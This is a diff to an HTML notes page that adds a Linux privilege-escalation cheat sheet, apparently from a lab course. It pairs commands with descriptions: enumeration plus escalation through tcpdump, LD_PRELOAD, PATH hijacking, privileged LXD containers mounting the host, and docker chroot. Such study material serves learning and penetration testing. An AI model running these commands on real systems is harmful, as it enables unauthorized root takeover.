@@ -34,10 +34,159 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh<br>
 
 <h1>Linux Privilege Escalation Checklist</h1>
 1. Check if GCC is present
-
-
-
 Link :<a href="https://gtfobins.github.io">gtfo.bin</a>
+
+<table class="table">
+   <thead>
+      <tr>
+         <th><strong>Command</strong></th>
+         <th><strong>Description</strong></th>
+      </tr>
+   </thead>
+   <tbody>
+      <tr>
+         <td><code>ssh htb-student@&lt;target IP&gt;</code></td>
+         <td>SSH to lab target</td>
+      </tr>
+      <tr>
+         <td>ps aux \| grep root</td>
+         <td>See processes running as root</td>
+      </tr>
+      <tr>
+         <td><code>ps au</code></td>
+         <td>See logged in users</td>
+      </tr>
+      <tr>
+         <td><code>ls /home</code></td>
+         <td>View user home directories</td>
+      </tr>
+      <tr>
+         <td><code>ls -l ~/.ssh</code></td>
+         <td>Check for SSH keys for current user</td>
+      </tr>
+      <tr>
+         <td><code>history</code></td>
+         <td>Check the current user&#39;s Bash history</td>
+      </tr>
+      <tr>
+         <td><code>sudo -l</code></td>
+         <td>Can the user run anything as another user?</td>
+      </tr>
+      <tr>
+         <td><code>ls -la /etc/cron.daily</code></td>
+         <td>Check for daily Cron jobs</td>
+      </tr>
+      <tr>
+         <td><code>lsblk</code></td>
+         <td>Check for unmounted file systems/drives</td>
+      </tr>
+      <tr>
+         <td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td>
+         <td>Find world-writeable directories</td>
+      </tr>
+      <tr>
+         <td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td>
+         <td>Find world-writeable files</td>
+      </tr>
+      <tr>
+         <td><code>uname -a</code></td>
+         <td>Check the Kernel versiion</td>
+      </tr>
+      <tr>
+         <td><code>cat /etc/lsb-release</code></td>
+         <td>Check the OS version</td>
+      </tr>
+      <tr>
+         <td><code>gcc kernel_expoit.c -o kernel_expoit</code></td>
+         <td>Compile an exploit written in C</td>
+      </tr>
+      <tr>
+         <td><code>screen -v</code></td>
+         <td>Check the installed version of <code>Screen</code></td>
+      </tr>
+      <tr>
+         <td><code>./pspy64 -pf -i 1000</code></td>
+         <td>View running processes with <code>pspy</code></td>
+      </tr>
+      <tr>
+         <td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
+         <td>Find binaries with the SUID bit set</td>
+      </tr>
+      <tr>
+         <td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
+         <td>Find binaries with the SETGID bit set</td>
+      </tr>
+      <tr>
+         <td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td>
+         <td>Priv esc with <code>tcpdump</code></td>
+      </tr>
+      <tr>
+         <td><code>echo $PATH</code></td>
+         <td>Check the current user&#39;s PATH variable contents</td>
+      </tr>
+      <tr>
+         <td><code>PATH=.:${PATH}</code></td>
+         <td>Add a <code>.</code> to the beginning of the current user&#39;s PATH</td>
+      </tr>
+      <tr>
+         <td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td>
+         <td>Search for config files</td>
+      </tr>
+      <tr>
+         <td><code>ldd /bin/ls</code></td>
+         <td>View the shared objects required by a binary</td>
+      </tr>
+      <tr>
+         <td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td>
+         <td>Escalate privileges using <code>LD_PRELOAD</code></td>
+      </tr>
+      <tr>
+         <td>readelf -d payroll  \| grep PATH</td>
+         <td>Check the RUNPATH of a binary</td>
+      </tr>
+      <tr>
+         <td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td>
+         <td>Compiled a shared libary</td>
+      </tr>
+      <tr>
+         <td><code>lxd init</code></td>
+         <td>Start the LXD initialization process</td>
+      </tr>
+      <tr>
+         <td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td>
+         <td>Import a local image</td>
+      </tr>
+      <tr>
+         <td><code>lxc init alpine r00t -c security.privileged=true</code></td>
+         <td>Start a privileged LXD container</td>
+      </tr>
+      <tr>
+         <td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td>
+         <td>Mount the host file system in a container</td>
+      </tr>
+      <tr>
+         <td><code>lxc start r00t</code></td>
+         <td>Start the container</td>
+      </tr>
+      <tr>
+         <td><code>showmount -e 10.129.2.12</code></td>
+         <td>Show the NFS export list</td>
+      </tr>
+      <tr>
+         <td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
+         <td>Mount an NFS share locally</td>
+      </tr>
+      <tr>
+         <td><code>tmux -S /shareds new -s debugsess</code></td>
+         <td>Created a shared <code>tmux</code> session socket</td>
+      </tr>
+      <tr>
+         <td><code>./lynis audit system</code></td>
+         <td>Perform a system audit with <code>Lynis</code></td>
+      </tr>
+   </tbody>
+</table>
+
 
 </body>
 </html>
